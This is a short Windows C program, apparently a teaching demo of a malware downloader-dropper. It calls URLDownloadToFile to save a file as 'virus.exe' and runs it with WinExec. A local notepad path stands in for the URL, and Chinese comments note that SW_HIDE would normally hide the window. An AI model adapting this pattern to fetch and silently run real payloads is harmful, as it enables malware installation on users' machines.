#include <windows.h>
#include <urlmon.h>
#pragma comment (lib, "urlmon")

int main()
{
    char szUrl[MAX_PATH] = "c:\\windows\\system32\\notepad.exe";
    char szVirus[MAX_PATH] = "d:\\virus.exe";

    URLDownloadToFile(NULL, szUrl, szVirus, 0, NULL);

    // 为了模拟方便看到效果，这里使用参数SW_SHOW
    // 一般可以传递SW_HIDE参数
    WinExec(szVirus, SW_SHOW);

    return 0;
}